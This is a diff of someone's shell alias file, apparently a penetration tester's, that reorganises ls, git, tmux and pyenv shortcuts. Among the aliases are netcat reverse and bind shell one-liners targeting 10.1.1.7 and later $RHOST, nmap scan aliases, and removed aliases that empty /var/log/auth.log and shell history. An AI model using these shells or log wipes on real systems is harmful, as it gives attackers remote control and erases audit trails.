@@ -1,126 +1,210 @@
-#http://askubuntu.com/questions/22037/aliases-not-available-when-using-sudo
+### Overridden commands ###
+alias mkdir="mkdir -pv"
+alias less="less -R"
+alias ls="ls -hpG"
 alias sudo="sudo "
-alias br='source ~/.bashrc'
-alias ports='netstat -tulanp'
-alias now='date +"%T"'
-alias nowtime='now'
-alias nowdate='date +"%d-%m-%Y"'
-alias checksum='rhash -r --md5 -p "%h, %p\n"'
-alias beep='echo -e "\a\c"'
-alias beep-lots='while :; do beep; sleep 1; done'
-
-# updating stuff
-alias update-sys='sudo apt-get update && sudo apt-get upgrade'
-alias update-github='cleanup-github-stuff ; github-new-aliases ; github-new-vim ; distribute-github-stuff'
-alias update-motd='sudo /usr/lib/update-notifier/update-motd-updates-available --force'
-
-### Enhanced commands ###
-alias ls="ls -hp --color=auto"
-alias ll='ls -la'
-alias l.='ls -d .* '                                            #Show hidden files
-alias ldir='ls -d */'
-alias ll="ls -la"
-alias ls-size="ll -lAS && echo '-------------Smallest-----'"
-alias ls-time="ls -lAt && echo '-------------Oldest-----'"
 alias mkdir='mkdir -pv'                                         #create parent dirs on demand
-alias chown='chown --preserve-root'
-alias chmod='chmod --preserve-root'
-alias chgrp='chgrp --preserve-root'
-alias chmod-setgid='chmod g+s'
-alias zip-dir='zip -r'
-alias wget='wget -c'                                            #turn on wget resuming
-alias wget-local='wget -p -k'
-alias curl-follow='curl -O -J -L'
-alias rsync-copy="rsync -avhP"
-alias screen-name='screen -S'
-
-alias outmail="mail -a\"From:`hostname`@nsecure.me\""
-
+alias wget="wget -c"
 ### Safer commands ###
-alias mv='mv -i'
-alias cp='cp -i'
-alias ln='ln -i'
-alias rm='rm -I --preserve-root'
-
-# when you mess up and type your password in the terminal
-alias clear-history='history -cw'
-alias wipe-auth='sudo cat /dev/null | sudo tee /var/log/auth.log'
-alias wipe-all='clear-history ; wipe-auth'
-
-# trims front and back whitespace plus tabs
-alias trim='awk '\''{$1=$1};1'\'''
-alias fixcut='tr -s " "'
-
-#cd aliases
-alias cd..='cd ..'
-alias ..='cd ..'
-alias ...='cd ../../../'
-alias ....='cd ../../../../'
-alias .....='cd ../../../../'
-alias .4='cd ../../../../'
-alias .5='cd ../../../../..'
-#alias cd_steam='cd ~/.wine32/drive_c/Program\ Files/Steam/'
-#alias cd_steamgames='cd ~/.wine32/drive_c/Program\ Files/Steam/steamapps/common/'
-#alias cd_progx86='cd ~/.wine32/drive_c/Program\ Files/'
-
-### openssl shortcuts
-alias sha1='openssl sha1'
-alias md5='openssl md5'
-
-### Pretty commands
-alias vmount='mount |column -t'
-alias vpath='echo -e ${PATH//:/\\n}'
-
-### User Definitions ###
-# compile with max debugging
-alias gcc-dev="gcc -g -Wall -Wextra -Winline"
-# Get your current public IP
-alias whatismyip="curl icanhazip.com"
-alias ipinfo="curl ifconfig.me && curl ifconfig.me/host"
-alias ipconfig="nmcli dev list iface eth0 | grep IP4"
-# count files in directory
-alias dircount='ls -1 | wc -l'
-alias webify="mogrify -resize 690\> *.png"
-alias most='du -hsx * | sort -rh | head -10'
-alias sort-dir-by-size='du -ha --max-depth=1 | sort -h'
-alias find_by_name_indir='sudo find . -iname '
-alias find_by_name_root='sudo find / -iname '
-alias grep_for_text='grep -inrI '
-
-# display top n elements and show ---
-alias headtail5="sed -ne'1,4{p;b};5{x;s/$/.../;x;G;p;b};:a;$p;N;11,$D;ba'"
-alias headtail10="sed -ne'1,9{p;b};10{x;s/$/.../;x;G;p;b};:a;$p;N;21,$D;ba'"
+alias mv="mv -i"
+alias cp="cp -i"
+alias ln="ln -i"
+alias rm="rm -I"
+### Enhanced commands ###
+alias l.="ls -d .*"
+alias la="ls -lAh"
+alias ll="ls -lah"
+alias ldir="ls -d */"
+alias lt='du -sh * | sort -h'
+alias ccd..="cd"
+alias cd..="cd .."
+alias ..="cd .."
+alias ...="cd ../../../"
+alias ....="cd ../../../../"
+alias .....="cd ../../../../"
+alias .4="cd ../../../../"
+alias .5="cd ../../../../.."
+alias desk="cd ~/Desktop"
+alias down="cd ~/Downloads"
 
 ### Shortcuts ###
-alias h='history'
-alias c='clear'
-alias cls='clear'
-alias dc='dircount'
+alias :q="exit"
+alias bye="exit"
+alias die="exit"
+alias quit="exit"
+alias ff="find . -type f -name"
+alias fd="find . -type d -name"
+alias h="history"
+alias h1="history 10"
+alias h2="history 20"
+alias h3="history 30"
+alias hgrep="history | grep"
+alias hd='hexdump -C'
+alias ipt='sudo /sbin/iptables'
+alias j='jobs -l'
+alias ckear="clear"
+alias c="clear"
+alias cl="clear"
+alias clr="clear"
+alias cls="clear"
+alias dircount="ls -1 | wc -l"
+alias dc="dircount"
+alias sha1="openssl sha1"
+alias md5="openssl md5"
+alias paux='ps aux | grep'
+alias sai="sudo apt-get install"
+alias sau="sudo apt-get update"
+alias svi='sudo vim'
+alias edit='vim'
 
-### useless stuff ###
+### Useful Commands ###
+
+### Pretty commands
+alias vmount="mount |column -t"
+alias vpath='echo -e ${PATH//:/\\n}'
+alias echo-path='echo -e ${PATH//:/\\n}'
+alias echo-mount="mount |column -t"
+
+### Useless stuff ###
 #alias lostterm='export PS1="\[\033[01;32m\]>: "'
 alias busy="cat /dev/urandom | hexdump -C | grep 'ca fe'"
 
-### netcat ###
-alias nc-trad-rev='nc -e /bin/sh 10.1.1.7 1234'
-alias nc-trad-bind='nc -e /bin/sh -l 1234'
-alias nc-trad-rev='nc -e /bin/bash 10.1.1.7 1234'
-alias nc-trad-rev='nc -e /bin/bash -l 1234'
-alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1.1.7 1234 >/tmp/f'
-alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f'
-alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.1.1.7 1234 >/tmp/f'
-alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f'
+### Derived commands ### 
+alias chmod-setgid="chmod g+s"
+alias cpy="xclip -selection clipboard"
+alias curl-follow="curl -O -J -L"
+### Docker ###
+#alias dl="sudo docker ps -l -q"
+#alias dps="sudo docker ps"
+#alias di="sudo docker images"
+#alias dip="sudo docker inspect --format '{{ .NetworkSettings.IPAddress }}'"
+#alias dkd="sudo docker run -d -P"
+#alias dki="sudo docker run -i -t -P"
+#alias dex="sudo docker exec -i -t"
+#alias drmf="sudo docker stop $(sudo docker ps -a -q) && sudo docker rm $(sudo docker ps -a -q)"
+alias du1="du -d1"
+alias git_revert_file="git checkout HEAD -- "
+alias git_init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
+alias gs="git status"
+alias gst="git status -sb"
+alias gl="git log"
+alias ga="git add"
+#alias gaa="git add -A"
+#alias gal="git add ."
+#alias gall="git add ."
+alias gca="git commit -a"
+alias gc="git commit -m"
+alias gcot="git checkout"
+alias gchekout="git checkout"
+alias gchckout="git checkout"
+alias gpsh="git push -u origin"
+alias grf="git checkout HEAD -- "
+alias gstash="git stash"
+alias gw="git whatchanged"
+alias gitlg="git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
+alias gcc-dev="gcc -g -Wall -Wextra -Winline"
+alias grep_for_text="grep -inrI "
+alias header='curl -I'
+alias iptlist='sudo /sbin/iptables -L -n -v --line-numbers'
+alias iptlistin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
+alias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
+alias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
+alias ls-size="ll -lAS && echo '-------------Smallest-----'"
+alias ls-time="ls -lAt && echo '-------------Oldest-----'"
+alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
+alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
+alias nc-trad-rev='nc -e /bin/bash $RHOST $RPORT'
+alias nc-trad-rev='nc -e /bin/bash -l $LPORT'
+alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f'
+alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $LPORT >/tmp/f'
+alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $RHOST $RPORT >/tmp/f'
+alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l $LPORT >/tmp/f'
+alias rsync-copy="rsync -avhP"
+alias wget-mirror-page="wget -p -k"
 
-alias hd-health='find /dev -regex "/dev/sd." -exec smartctl -l selftest {} \;'
+### User Definitions ###
+alias beep='echo -e "\a\c"'
+alias beep-lots='while :; do beep; sleep 1; done'
+alias brewa="arch -arm64 brew "
+alias brewai="arch -arm64 brew install"
+alias brewarm="arch -arm64 brew "
+alias brewarmi="arch -arm64 brew install"
+alias br="source ~/.bashrc"
+alias zr="source ~/.zshrc"
+alias hd_health='find /dev -regex "/dev/sd." -exec smartctl -l selftest {} \;'
+alias headtail5="sed -ne'1,4{p;b};5{x;s/$/.../;x;G;p;b};:a;$p;N;11,$D;ba'"
+alias headtail10="sed -ne'1,9{p;b};10{x;s/$/.../;x;G;p;b};:a;$p;N;21,$D;ba'"
+alias fixcut='tr -s " "'
+alias most="du -hsx * | sort -rh | head -10"
+alias now='date +"%T"'
+alias nowtime="now"
+alias nowdate='date +"%d-%m-%Y"'
+### nmap ###
+alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
+alias nmap-full='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -p- -O -oA $RHOST"_nmap_full"'
+alias nmap-udp='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sU --top-ports 20 -O -oA $RHOST"_nmap_udp"'
+alias serve2="python -m SimpleHTTPServer"
+alias serve3="python3 -m http.server"
+### pip ###
+alias pipr="pip install -r requirements.txt"
+### pyenv ###
+alias pyg="pyenv global"
+alias pyi27="pyenv install 2.7.18"
+alias pyi36="pyenv install 3.6.15"
+alias pyi38="pyenv install 3.8.13"
+alias pyi-list="pyenv install -l"
+alias pyi-search="pyenv install -l | grep"
+alias pyl="pyenv local"
+alias pyu="pyenv uninstall "
+alias pyver="pyenv version"
+alias pyvers="pyenv versions"
+alias py-virt-new="pyenv virtualenv "
+alias py-virt-ls="pyenv virtualenvs"
+alias pywhich="pyenv which"
+alias pyw="pyenv which"
+### ssh ###
+alias fingerprint='ssh-keygen -lf'
+alias pubkey='ssh-keygen -y -f'
+alias sshcpi='ssh-copy-id'
+### screen ###
+alias screen-attach="screen -Rd"
+alias screen-list="screen -ls"
+alias screen-new="screen -S "
+alias sa="screen-attach"
+alias sl="screen-list"
+alias sn="screen-new"
+### tmux ###
+alias ta="tmux attach -t "             #Attach new tmux session to already running named session
+alias tad="tmux attach -d -t "         #Detach named tmux session
+alias ts="tmux new-session -s "        #Create a new named tmux session
+alias tl="tmux list-sessions"          #Displays a list of running tmux sessions
+alias tksv="tmux kill-server"          #Terminate all running tmux sessions
+alias tkss="tmux kill-session -t "     #Terminate named running tmux session
+alias tmuxconf="$EDITOR $ZSH_TMUX_CONFIG"  #Open .tmux.conf file with an editor
+alias tmuxreload="tmux source-file $ZSH_TMUX_CONFIG"
+#alias sort_dir_by_size="du -ha --max-depth=1 | sort -h"
+alias trim='awk '\''{$1=$1};1'\'''
+alias usage='du -ch | grep total'
+### venv ###
+alias ve="python -m venv ./env"
+alias va="source ./env/bin/activate"
+alias vde="deactivate"
+### vscode ###
+alias vsc="code ."                  # Open the current folder in VS code
+alias vsca="code --add "            # Add folder(s) to the last active window
+alias vscd="code --diff"            # Compare two files with each other.
+alias vscg="code --goto"            # Open a filespec file:line[:char]
+alias vscn="code --new-window"      # Force to open a new window.
+alias vscr="code --reuse-windows"   # Force to open a file or folder in the last active window.
+alias webify="mogrify -resize 690\> *.png"
+alias whatismyip="curl icanhazip.com"
 
-### git ###
-alias git-old-file='git checkout HEAD -- '
-alias git-init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
-
+### Conditional Aliases ###
 if command -v lsb_release &> /dev/null
 then
     if [[ $(lsb_release -i) == *Kali* ]]
     then
-        alias nautilus='thunar'
+        alias nautilus="thunar"
     fi
 fi
+
